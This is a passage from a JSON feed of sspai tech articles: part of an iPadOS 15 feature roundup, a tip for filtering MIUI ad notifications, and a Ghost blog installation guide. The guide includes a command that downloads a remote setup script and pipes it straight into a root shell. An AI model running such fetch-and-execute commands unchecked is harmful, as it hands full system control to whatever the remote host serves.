中你依然可以那么做，而且现在变得更加方便。在 iPadOS 15 的 App 切换界面，你可以直接把一个应用程序拖拽到已经打开的窗口上，新的分屏视图就会自动创建了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/109ae02fb7c3e263b86596c28a0531a2.gif\"><figcaption>直接拖拽就可以创建</figcaption></figure><p>对于同一个 App 打开了多个窗口的情况，iPadOS 15 也做了针对性的优化——「App 架」，通过 App 架用户可以查看一个应用程序的所有的窗口。无论是打开 App 时、还是使用分屏菜单、使用拖拽的分屏操作或是和以前一样使用「显示所有窗口」按钮，只要是这个应用已经打开了不止一个窗口，App 架就会出现来让用户选择最正确的窗口。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/f8b6c75c23e5c6573e514d08d9b33d13.gif\"><figcaption>App 架会在必要时出现</figcaption></figure><p>iPadOS 15 的多任务视图目前还针对系统内的邮件、笔记和消息对话提供了一个新的分屏方式「在屏幕中央打开」，通过这种分屏方式可以快速浏览、添加或是回复内容，而不用像以前一样切换到其他窗口。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/11/47f9a85a07c649d71a0e05601b338014.gif\"><figcaption>新的分屏方式</figcaption></figure><h3>小组件、App 资源库</h3>\n<p>经过了一年的等待，App 资源库终于来到了 iPadOS 15，它位于 Dock 的最右侧，无论是在桌面还是在应用内都可快速调用 App 资源库。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/dba9a7e761758dd531be9f9d34770148\"><figcaption>位于 Dock 最右的 App 资源库</figcaption></figure><p>同时小组件也能和 iOS 14 一样摆放在桌面上了，用户可以通过小组件的摆放获得非常个性化的信息浏览体验。而针对 iPad 拥有更大的显示屏，iPad 上小组件也新增了更大的尺寸，这样可以展示的信息也会比原来更多。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/5c7795743aeb23a187a1cfca944f808b\"><figcaption>超大尺寸的日历能够展示更多的信息</figcaption></figure><p>新的智能堆叠组件也变得更智能了，它不仅会根据用户过去的活动适时地选择堆叠中的组件；它还会预测即将到来的事件，把那些不在堆叠里的小工具，暂时性置顶在堆叠中，并在完成后自动消失。让用户一目了然地获得更多的信息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/0268015b7c665d368bf5439bc8d1407e\"><figcaption>日历原本并不在堆叠中</figcaption></figure><h3>备忘录</h3>\n<p>备忘录应用在 iPadOS 15 上也得到了质的提升。首先是快速笔记功能，原本想要在 iPadOS 上新建一个笔记只有两种办法，一是通过控制中心预先放置的按钮新建，二是通过 Apple Pencil 在锁屏界面点击一下新建。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/e943f55dad7efd0a4362d7ed5ea8485c.gif\"><figcaption>从角落唤出快速笔记</figcaption></figure><p>而 iPadOS 15 对快速笔记做了次逻辑上的升级，像是便签纸一样，用户可以在<strong>任何界面</strong>用 Apple Pencil 把它从右下角「拽」出来。这张「便签纸」还可以任意放大缩小并改变所在的位置，或是临时将它隐藏起来。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/11/3db0107d871a08766320fcb06f9f61e9.gif\"><figcaption>可放大可缩小可隐藏</figcaption></figure><p>除了能在这张「纸」上写写画画，用户还可以把网页或者应用程序的链接放到便签纸上，当用户下次再次打开这个网页和应用程序时，快速笔记的缩略图会重新出现在角落里，提醒用户曾经做过与之相关的笔记。甚至在「亲儿子」Safari 里，用户还可以把文本和图像突出标记以后，直接放入到快速笔记里，用于持续跟踪访问过的内容。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/161bbfa601c6c8de53b8d558a9bc61a9\"><figcaption>及时回顾网页内容</figcaption></figure><p>除了快速笔记功能，备忘录本身也得到了不小的加强。在共享笔记方面，用户可以通过活动列表查看笔记所有的更新摘要和每个合作者修改的轨迹；还可以在笔记任何的地方向右滑动，查看谁对这边做了哪些修改、修改的日期和时间，且还会使用相同的颜色把该合作者所有修改的地方使用高亮标记出来，更细致的查阅所有修改。和 iOS 15 一样还可以使用 <code>@</code> 来提醒写作者。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/4a635a0658ddb158a7e3d3902cf35dab\"><figcaption>查看活动记录</figcaption></figure><p>在个人使用方面，和 iOS 15 一样加入了标签的支持，用户可以利用标签进一步组织所有的笔记了；还可以创建基于标签的智能文件夹，用户可以打破原有基于文件夹的组织结构，用另外一个视角整理和使用笔记。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/11/article/a154d8afe5c15bea69fd587bc3321421\"><figcaption>笔记应用里的智能文件夹</figcaption></figure><h3>Safari</h3>\n<p>新的 Safari 不仅和 Mac 一样把标签栏和地址栏合二为一，还重新设计了一个新的侧边栏，用户可以在侧边栏中管理标签页、标签组、书签、阅读列表以及所有与你分享等内容，方便用户使用这些功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/9aaa6419c9f8fe57eff7059b631ea73a\"><figcaption>iPad Safari 有了新的侧边栏</figcaption></figure><p>标签组也是 iPadOS 15 里的新功能，用户可以按照类型、实际用途分门别类地保存、组织和管理不同的标签，标签组也支持在 Mac 和 iPhone 上同步，让用户继续完成浏览。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/60c6d84d2d2b9c96a06c22a904322c1c\"><figcaption>标签组功能</figcaption></figure><p>iOS / iPadOS 上的 Safari 也支持使用扩展插件了，App Store 也已上线相关页面。</p>\n<p>上述大部分功能也在 iOS 15 中进行了更新，iPhone 上的 Safari 浏览器也增加了更多手势操作，比如在地址栏处单指左右滑动，即可快速切换前后标签页面。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/09/40af154a7e66fbbf83ce5985b47fbf3d.gif\"><figcaption>iOS 15 中 Safari 滑动地址栏就可以快速切换标签页</figcaption></figure><h3>翻译</h3>\n<p>iPad 上的翻译应用同样姗姗来迟，但也带来了很多新特性。首先，用户只要是能在 iPad 上选中的内容可以点击「翻译」来进行翻译；而那些不能选中的文字还可以使用实况文本，将它转换成可以选中的内容进行翻译；甚至是用户手写的内容也可以被选中翻译。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/5e474782c16ece5200a24dae96278757\"><figcaption>系统级翻译</figcaption></figure><p>iPad 翻译还针对实时翻译场景做了优化，它会自动检测什么时候开始说话以及什么停止说话，进而做到实时翻译的效果；此外，用户还可以调整翻译视图，无论是面对面聊天还是在同侧，总有一种视图适合当下的场景。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/493200458e6425a82a6c56c49ccbbffe\"><figcaption>无论是并排还是面对面都可以充分利用 iPad 大尺寸的屏幕</figcaption></figure><p>翻译 App 还支持完全离线使用，收藏常用短语和调用内置词典等功能。</p>\n<h3>其它值得关注的 iPadOS 15 新功能</h3>\n<ul>\n<li>使用通用控制可以在 Mac 和 iPad 之间使用同一个鼠标、触摸板和键盘，还可以在 iPad 和 Mac 之间拖放内容；</li>\n<li>iPad 外置键盘快捷栏经过了重新设计，快捷键提示也重新设计，还可以设置更多的键盘快捷方式；</li>\n<li>提醒事项支持自然语义识别、标签和自定义智能列表；</li>\n<li>文件支持读取 NTFS 格式的硬盘，此外复制和移动大量文件时提供进度条；</li>\n<li>未来通过 Swift Playgrounds 可以直接在 iPad 上为 iPhone 和 iPad 开发 app 并提交至 App Store。</li>\n</ul>\n<p>你还发现了哪些 iOS / iPadOS 15 中值得关注的新功能，欢迎在评论区告诉我们。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，带你了解 Apple 新硬件 &amp; 新系统 📱</p>\n<p>&gt; 特惠、好用的硬件产品，尽在 <a href=\"https://shop549593764.taobao.com/?spm=a230r.7195193.1997079397.2.2ddc7e0bPqKQHc\">少数派 sspai 官方店铺</a> 🛒</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68870"},{"title":"一日一技 | 免 root、无需 ADB，用通知滤盒干掉 MIUI 的广告推送","date":"2021-09-20 07:00:00","description":"\n<p>MIUI 在我看来一直算是国内定制系统中广告推送开关给得最到位、也最完善的一家，但用过 MIUI 的朋友应该也会发现，即便我们仔细检查过系统和内置应用的所有广告设置，一番事先配置之后，手机依然会在待机一段时间后收到不少广告推送。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/64200\" target=\"_blank\">当我们谈论「系统广告」时，想吐槽的 ADUI 其实不止一个</a></p>\n<h2>烧不尽的广告推送</h2>\n<p>普通用户面对这些广告推送通知时一般都会觉得有心无力。</p>\n<p>一方面它们依托小米稳定、可靠的推送系统，甚至能够在应用本身从未启动的情况下、实现周期性广告推送，自然也无法借助通知分类这种途径进行针对性阻断；</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c540n05b34te12vuo5tg.jpeg\"><figcaption>长按 MIUI 通知只能「一刀切」</figcaption></figure><p>另一方面，MIUI 至今没能就通知管理方式做出太大的改进。即便应用已经在使用过程中创建了通知分类，当我们像使用其它 Android 手机那样试图通过长按通知、关闭对应分类的方式对广告推送进行管理时，又会发现 MIUI 根本就不提供简单、明了的通知分类指引，具体得关哪个还得自己一个个尝试、排除。</p>\n<h2>智能服务，会「伪装」的症结</h2>\n<p>事实上，MIUI 中大部分广告推送都与一个叫做「智能服务」的系统应用有关。在 MIUI 中，智能服务能够发出完全以其它应用样式为「包装」的广告推送通知，这些通知在通知栏中以其它应用的样式存在，点击通知内容会跳转到这些应用当中，长按通知进行通知管理时，自然也是「治标不治本」——即便我们在看到一条微博的广告推送后将微博的「微博热点」完全关闭，不久后还是会收到类似的通知。</p>\n<figure class=\"ss-imgRows\" figcaption=\"MIUI 的广告通知推送，它们都有着相同的特点\"><img src=\"https://cdn.sspai.com/editor/u_/c540n0db34te2r9sanpg.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c540n0tb34te12vuo5u0.jpeg\" alt=\"\"></figure><p>这类由智能服务「伪装」而成的通知其实也很好辨认。无论是否包含图片，这些通知在 MIUI 的通知中心中一般都会提供两个操作选项：一个是「忽略」，即手动清除这条通知；另一个则是「立即打开」，即借助智能服务这座桥梁跳转到具体的应用当中。</p>\n<figure class=\"ss-imgRows\" figcaption=\"在系统中默认隐藏的「智能服务」\"><img src=\"https://cdn.sspai.com/editor/u_/c540n15b34te2r9sanq0.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c540n15b34te2hpltpbg.jpeg\" alt=\"\"></figure><p>P.S. 尽管有着一个唬人的中文应用名称，「智能服务」的英文包名其实是 <code>com.miui.systemAdSolution</code>。为了避免用户对其进行干扰，MIUI 甚至能在部分第三方应用中默认对其进行隐藏。</p>\n<h2>无痛、不折腾的解决方案</h2>\n<p>找到「智能服务」这一症结之后，在<strong>免 root、无需 ADB </strong>操作这一大前提下，此前少数派已经多次介绍过的 <a href=\"https://sspai.com/post/59502\" target=\"_blank\">通知滤盒</a> 就成为了我们用来干掉 MIUI 大部分广告推送的绝佳选择。</p>\n<p>操作方法也非常简单：</p>\n<p>根据实际情况为通知滤盒进行环境配置，确保其后台运行，包括但不限于将后台配置设置为「无限制」、在多任务界面中锁定应用卡片等；</p>\n<p>然后，我们在通知滤盒的「规则」页面中点击右下角的添加按钮，进入规则创建页面。填上一个好记的名字之后（比如 <code>MiPuShIt</code>，没有双关的意思），进行规则范围和执行操作设置，具体包括：</p>\n<p>App 选择「包含」，然后点击下方搜索弹出应用搜索界面。在这个界面中，我们首先需要点击搜索框右上角的菜单并勾选「隐藏」应用，然后就能搜索到「智能服务」了；</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c540n1db34te2hpltpc0.jpeg\"><figcaption>勾选「隐藏」后搜索智能服务</figcaption></figure><p>执行操作这边选择「消除」，同时勾选上下方的「点击通知按钮」，按钮名称填入「忽略」；</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c540n1lb34te2nr88flg.jpeg\"><figcaption>规则配置页面</figcaption></figure><p>如果你的通知中心此时正好有智能服务伪装的广告推送，这时也可以点击模拟测试来看看是否能够正确命中。</p>\n<p>配置完成后，通知滤盒就能在后台 7*24 小时全天候自动帮我们消除来自「智能服务」的广告推送了。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c540n1tb34te2nr88fm0.jpeg\"><figcaption>使用一周屏蔽 40 条广告推送，每天少看 5 条左右</figcaption></figure><h2>小结</h2>\n<p>虽然智能服务大概率是小米借助 MiPush 小米推送服务向厂商开放的广告推送方案（我们无从验证这个想法），但一番测试体验下来我们也发现，它所使用的通道和应用本身的 MiPush 通知推送通道是相互独立的。</p>\n<p>因此我们上面在设置智能服务通知屏蔽规则时，默认也是全盘屏蔽所有时间、所有内容的，基于 MiPush 的其他重要通知，比如银行消费提醒，依然能够即时送达。</p>\n<p>由于通知滤盒本身无需 root 和 ADB，这套方案在其他采用类似方案进行广告推送的定制系统中也有一定参考性，条件所限本文也就不一一测试了，欢迎大家在评论区分享你的方法和使用体验。</p>\n<p>题图来自 <a href=\"https://www.freepik.com/vectors/facebook\" target=\"_blank\">freepik</a></p>\n<p><strong>关联阅读：</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/60536\" target=\"_blank\">微信群聊不是法外之地：用通知滤盒降低敏感词「炸群」风险</a></li>\n<li><a href=\"https://sspai.com/post/68177\" target=\"_blank\">一日一技 | 如何优雅地转发任意通知到 iPhone</a></li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\" target=\"_blank\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68894"},{"title":"从部署到思考，我的 Ghost 博客搭建手记","date":"2021-09-20 03:00:00","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改</p>\n<hr>\n<h2>为什么会选择 Ghost？</h2>\n<p>折腾博客将近 6 年了，尝试过 WordPress、Typecho、Ghost、Hexo、Gridea 等不少的博客程序。这些程序各有优缺点，WordPress 的高度个性化与可玩性值得称赞，但也给站点优化带来了问题；基于 Node.js 的 Hexo 搭配上 GitHub Pages，降低了博客搭建的门槛，但渲染速度、npm、跨平台都是逃不过的问题。</p>\n<p>从体验上来说，我更偏向自托管的静态博客，数据在自己的服务器上，一定程度上保证用户对内容的所有权。因为对 Git 平台的操作不熟悉，加上 访问速度不佳，我将博客从 Hexo 迁移到了 Gridea，但后者长时间停更，以及主题数量偏少，我开始寻找下一个适合的博客程序。</p>\n<p>3 月 16 日，Ghost 发布 4.0 版本，与先前 1.0、2.0 版本不同，Ghost 4.0 版本中新增了后台面板、订阅支持，同时也继承先前版本优秀的设计。或许，可以试试？</p>\n<h2>搭建前的准备</h2>\n<h3>域名</h3>\n<p>通过自己的服务器搭建博客，通常需要绑定域名，关于选购与注册方面，在这里不做过多阐述。注册好域名后，在域名解析设置中，将域名解析至服务器 IP。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/article/47487b7bd1617cc59f0d6d4e7e217177\"><figcaption>域名解析</figcaption></figure><h3>服务器</h3>\n<p>由于 Ghost 是动态博客，因此需要准备一台服务器。官方文档中推荐使用 RAM ≥ 1G、运行在 Ubuntu 16.04 / 18.04 / 20.04 系统的服务器上。除了基于 Node.js 运行，Ghost 官方还提供<a href=\"https://ghost.org/docs/install/docker/\" target=\"_blank\">基于 Docker</a> 运行的 Ghost Blog。</p>\n<h2>本机直接部署</h2>\n<blockquote>\n<p>系统：Ubuntu 21.04、Debian 11.0</p>\n<p>Nginx：nginx/1.18.0</p>\n<p>MySQL：8.0.26</p>\n<p>Node.js：v14.17.6</p>\n<p>Ghost：v4.9.4</p>\n</blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/16c18e2fe55944df8cf83d45c4678f6e.jpg\"><figcaption>安装流程</figcaption></figure><h3>初步配置</h3>\n<p>通过 SSH 或终端登入服务器，并切换至 root 用户，然后新增一个普通用户，用于安装 Ghost。</p>\n<p>运行更新服务器中的软件。</p>\n<pre class=\"language-shell\"><code># 更新系统软件包\napt update &amp;&amp; apt upgrade -y</code></pre>\n<p>运行 adduser 命令添加新普通权限的 Linux 用户，根据提示输入用户密码与其它信息。</p>\n<pre class=\"language-shell\"><code># 新增普通用户，用户名需自行设定（除 ghost）\nadduser 用户名</code></pre>\n<p>为新增用户添加 sudo 权限，并将当前身份切换为该用户。</p>\n<pre class=\"language-shell\"><code># 赋予用户 sudo 权限\nusermod -aG sudo 用户名\n\n# 切换到普通用户\nsu - 用户名</code></pre>\n<h3>安装网站环境</h3>\n<p>Ghost 未限制网站环境的安装方式，你可以使用 Nginx 或 Apache 运行前端，下文以官方文档介绍的安装方式为主。如需使用 LAMP 环境包 / LNMP 环境包 / OneinStack / 面板，需留意在安装 Ghost 环节，跳过 ghost-cli 自动配置 Nginx 与 SSL 环节，并手动建立网站，将反向代理部分的配置写入网站配置文件中。</p>\n<p>从 Ubuntu 仓库安装 Nginx 与 MySQL 数据库。</p>\n<pre class=\"language-shell\"><code># 从 Ubuntu 仓库中安装 Nginx 与 MySQL-Server\nsudo apt install nginx mysql-server -y</code></pre>\n<p>MySQL 安装完成后，需要重设数据库 root 用户密码。</p>\n<pre class=\"language-shell\"><code># 重置 MySQL root 密码\nsudo mysql\nALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '新密码';\nquit;</code></pre>\n<p>从 <a href=\"https://github.com/nodesource/distributions\" target=\"_blank\">NodeSource</a> 安装 Node.js。如果通过其它方式安装，需要留意 Node.js 版本 Ghost 只支持运行在 Node.js 12.x、14.x 两个大版本中。</p>\n<pre class=\"language-shell\"><code># 通过 NodeSource 安装指定版本的 Node.js\ncurl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash\nsudo apt install nodejs -y\n\n# 安装 Yarn\ncurl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | sudo apt-key add -\necho \"deb https://dl.yarnpkg.com/debian/ stable main\" | sudo tee /etc/apt/sources.list.d/yarn.list\nsudo apt update &amp;&amp; sudo apt install yarn -y\n\n# 假如服务器位于大陆区域，需要借助 cnpm 镜像提高 npm 与 yarn 依赖的安装速度，否则 ghost install 时，无法下载依赖会导致安装失败\nsudo npm install -g cnpm --registry=https://registry.npm.taobao.org\nsudo yarn config set registry https://registry.npm.taobao.org/</code></pre>\n<h3>安装 Ghost</h3>\n<p>建立文件夹，配置好文件夹权限，下文以 <code>/var/www/ghost</code> 作为 Ghost 数据目录。</p>\n<pre class=\"language-shell\"><code># 新建 Ghost 数据目录文件夹\nmkdir -p /var/www/ghost\n\n# 设置文件夹权限\nchown 用户名:用户名 -R /var/www/ghost\nchmod 0775 -R /var/www/ghost\n\n# 前往文件夹\ncd /var/www/ghost</code></pre>\n<p>安装 Ghost-CLI。</p>\n<pre class=\"language-shell\"><code># 未配置 cnpm 加速源\nsudo npm install ghost-cli@latest -g\n\n# 配置了 cnpm 加速源\nsudo cnpm install ghost-cli@latest -g</code></pre>\n<p>前往网站文件夹安装 Ghost。</p>\n<pre class=\"language-shell\"><code># 安装 Ghost\nghost install</code></pre>\n<p>进入安装流程。</p>\n<pre class=\"language-shell\"><code># 进入 Ghost 安装流程\n\n# 检查系统环境\n✔ Checking system Node.js version - found v14.17.6\n✔ Checking logged in user\n✔ Checking current folder permissions\n\n# 此处如系统版本非 Ghost 官方文档推荐的，会询问是否继续安装，这里选择 Yes\n? Continue anyway? Yes\nSystem stack check skipped\n\n# 检查软件环境\nℹ Checking system compatibility [skipped]\n✔ Checking for a MySQL installation\n✔ Checking memory availability\n✔ Checking free space\n✔ Checking for latest Ghost version\n✔ Setting up install directory\n\n# 下载 Ghost 本体、npm 与 yarn 依赖\n# 假如服务器位于大陆区域，需要借助 cnpm 镜像提高 npm 与 yarn 依赖的安装速度，否则 ghost install 时，无法下载依赖会导致安装失败\n✔ Downloading and installing Ghost v4.14.0\n\n# 进入网站域名、MySQL 数据库、系统服务设置\n✔ Finishing install process\n\n# 输入网站绑定域名\n? Enter your blog URL: http://xavier.wang\n\n# 输入 MySQL 数据库服务器地址、用户名、密码、数据库名称\n? Enter your MySQL hostname: localhost\n? Enter your MySQL username: root\n? Enter your MySQL password: [hidden]\n? Enter your Ghost database name: db_ghost\n✔ Configuring Ghost\n✔ Setting up instance\n+ sudo chown -R ghost:ghost /var/www/ghost/content\n✔ Setting up \"ghost\" system user\n\n# 如先前使用 MySQL root 用户登录，此处可以让 ghost-cli 自动创建一个属于 Ghost 数据库的用户\n? Do you wish to set up \"ghost\" mysql user? Yes\n✔ Setting up \"ghost\" mysql user\n\n# 如果本机先前已有其它网站或需要使用自定义的网站环境，需要跳过自动配置 Nginx 与 SSL 证书\n? Do you wish to set up Nginx? Yes\n+ sudo mv /tmp/xavier-wang/xavier.wang.conf /etc/nginx/sites-available/xavier.wang.conf\n+ sudo ln -sf /etc/nginx/sites-available/xavier.wang.conf /etc/nginx/sites-enabled/xavier.wang.conf\n+ sudo nginx -s reload\n✔ Setting up Nginx\n# 选择是否通过 acme.sh 自动配置 SSL 证书\n? Do you wish to set up SSL? Yes\nℹ Setting up SSL [skipped]\n\n# 将 Ghost 绑定到 Systemctl 上\n? Do you wish to set up Systemd? Yes\n+ sudo mv /tmp/xavier-wang/ghost_xavier-wang.service /lib/systemd/system/ghost_xavier-wang.service\n+ sudo systemctl daemon-reload\n✔ Setting up Systemd\n+ sudo systemctl is-active ghost_xavier-wang\n\n# 启动 Ghost\n? Do you want to start Ghost? Yes\n+ sudo systemctl start ghost_xavier-wang\n+ sudo systemctl is-enabled ghost_xavier-wang\n+ sudo systemctl enable ghost_xavier-wang --quiet\n✔ Starting Ghost\n\nGhost uses direct mail by default. To set up an alternative email method read our docs at https://ghost.org/docs/config/#mail\n\n------------------------------------------------------------------------------\n\n# 当显示这条信息时，表示 Ghost 已完成安装流程\nGhost was installed successfully! To complete setup of your publication, visit: http://xavier.wang/ghost/</code></pre>\n<p>在设置过程中，按照提示设置域名、数据库连接信息、SSL 证书、系统服务。使用「LAMP 环境包 / LNMP 环境包 / OneinStack / 面板」的用户需留意在安装 Ghost 环节，跳过 ghost-cli 自动配置 Nginx 与 SSL 环节，并手动建立网站，将反向代理部分的配置写入网站配置文件中。</p>\n<pre class=\"language-shell\"><code># Nginx 反向代理配置\n\nlocation / {\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n        proxy_set_header X-Forwarded-Proto $scheme;\n        proxy_set_header X-Real-IP $remote_addr;\n        proxy_set_header Host $http_host;\n        proxy_pass http://127.0.0.1:2368;\n    }</code></pre>\n<p>当提示 <code>Ghost was installed successfully</code> 时，表示 Ghost 安装成功，点击下方域名进入博客后台设置。</p>\n<h2>站点配置</h2>\n<h3>初始化网站</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/article/c3001c60b0a2c4c404171def0c50b477\"><figcaption>Ghost 博客首页</figcaption></figure><p>在浏览器中输入域名，比如我绑定的是 xavier.wang，那么就输入 https://xavier.wang/ghost/ 进入 Ghost 后台，进入配置环节。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/article/81bf0c2ea438b975ba6c5572f978f1ae\"><figcaption>Ghost 博客配置 - 第一步</figcaption></figure><p>设置网站信息、管理员用户名与密码。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/article/0be501b6fa02f9e59937a96e0a5db025\"><figcaption>Ghost 博客配置 - 第二步</figcaption></figure><p>完成设置，进入博客后台。</p>\n<h3>后台设置</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/article/fe1e35c006a9708ed5e16a07f7cf656e\"><figcaption>Ghost 博客后台面板</figcaption></figure><p>后台大致分为两个版块，左侧菜单栏与右侧面板。点击左下方的齿轮按钮，可以看到博客设置，如站点信息、主题、导航链接、用户、高级功能等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/article/fcb632a547cfa5c49e8278c94117c997\"><figcaption>Ghost 博客后台设置</figcaption></figure><h2>关于 Ghost 的一些看法</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/article/7e567bf920b0bdd9d8417f7f5fddb201\"><figcaption>Ghost 后台面板</figcaption></figure><p>Ghost 4.0 版本中首次集成了原生的会员管理与订阅功能，通过连接第三方支付服务，可以向注册用户提供付费内容、邮件订阅服务。在博客后台的 Dashboard 上，直观展示了当前的文章收入、注册会员数量、付费会员比例、邮件打开率等数据。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/article/369d4d61122a41387ec736079ddc72aa\"><figcaption>Ghost 博客文章编辑</figcaption></figure><p>Ghost 的编辑器原生支持实时渲染 Markdown 语法，并且还有与 Notion 编辑器类似的「Type '/' for commands」功能，可快捷插入多媒体内容，如图片、YouTube 视频、Twitter 推文等卡片。</p>\n<p>在编辑器的文章发布设置中，可以直接设置文章摘录、分享样式、邮件订阅，这个功能点对于自媒体 / Newsletter 运营者十分友好，在发布文章的同时，可以完成社交媒体分享、邮件订阅发送、文章发布等动作，减少工作程序。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/article/ccdaf85b26e8ec38c7e35ca46dd1be3d\"><figcaption>Ghost 博客插件拓展（Integrations）</figcaption></figure><p>与 WordPress、Hexo 等博客平台相比，Ghost 会更注重写作与阅读，它在插件拓展、博客样式的个性化方面上会显得比较简陋，支持的插件（Integrations）会更多来自成熟的外部服务，以丰富读者阅读的内容。</p>\n<p>但也有不足的地方，对于拓展博客自身的功能性上，更多要靠后期开发，比如文章搜索、云储存、图片压缩，对的，Ghost 没有默认搜索功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/article/36ef298b973e074c427e1d3c01064b01\"><figcaption>Ghost 博客主题自定义</figcaption></figure><p>主题自定义方面，默认设置中只给到了站点 Logo、焦点颜色、Banner 底图的设置，更深层次的个性化修改，则需要修改主题的相关文件。GitHub、ThemeForest 上有一些比较好看的第三方主题，如 <a href=\"https://github.com/zutrinken/attila\" target=\"_blank\">Attila</a>、<a href=\"https://github.com/eddiesigner/liebling\" target=\"_blank\">Liebling</a>、<a href=\"https://github.com/ChrisW-B/london-grid\" target=\"_blank\">London-Grid</a>，官方的主题商城内提供了 24 款免费主题，付费主题价格较高，相对来说 Ghost 的主题数量仍然偏少。</p>\n<p>Ghost 博客相对于 WordPress 而言会更加简约，同时优秀的设计风格也会让人耳目一新。但 Ghost 是否值得推荐呢？</p>\n<p>如果是对平台运行追求稳定的自媒体、Newsletter 运营团队来说，Ghost 或许是一个不错的选择，文章编辑器、会员管理、第三方服务可圈可点，Ghost 也提供了官方的付费托管服务 —— <a href=\"https://ghost.org/pricing/\" target=\"_blank\">Ghost Pro</a>，让你专注于内容创作，以及加强与读者互动。</p>\n<p>就我个人的需求来说，我认为不值得。一是 Ghost 的主题、插件拓展生态圈还未发展起来；其次，Ghost 数据导出仅支持 json 格式，相关的迁移工具如 <a href=\"https://www.npmjs.com/package/oghost\" target=\"_blank\">oghost</a>、<a href=\"https://github.com/jasonslyvia/hexo-migrator-ghost\" target=\"_blank\">hexo-migrator-ghost</a> 停更已久，迁移至 <a href=\"https://github.com/amayem/GhostJSON-to-WPXML\" target=\"_blank\">WordPress</a>、<a href=\"https://www.pgrs.net/2018/11/25/migrating-blog-from-ghost-to-jekyll/\" target=\"_blank\">Jekyll</a>、<a href=\"https://github.com/jbarone/ghostToHugo\" target=\"_blank\">Hugo</a> 的工具虽然有更新，但跨程序之间的搬运并不是一件轻松事。第三点，也是最头疼的一点，Node.js 和 npm 的报错，看到密密麻麻的报错我都不想处理了。</p>\n<h2>相关阅读</h2>\n<ul>\n<li><a href=\"https://sspai.com/post/65602\" target=\"_blank\">WordPress 有力竞争者，高颜值全能平台：Ghost</a></li>\n<li><a href=\"https://iiong.com/gost-blog-install-notes/\" target=\"_blank\">Ghost 安装笔记</a></li>\n<li><a href=\"https://ghost.org/docs/install/ubuntu\" target=\"_blank\">How to install Ghost on Ubuntu</a></li>\n<li><a href=\"https://sspai.com/post/47479\" target=\"_blank\">Ghost 博客数据自动备份和图片自动压缩</a></li>\n<li><a 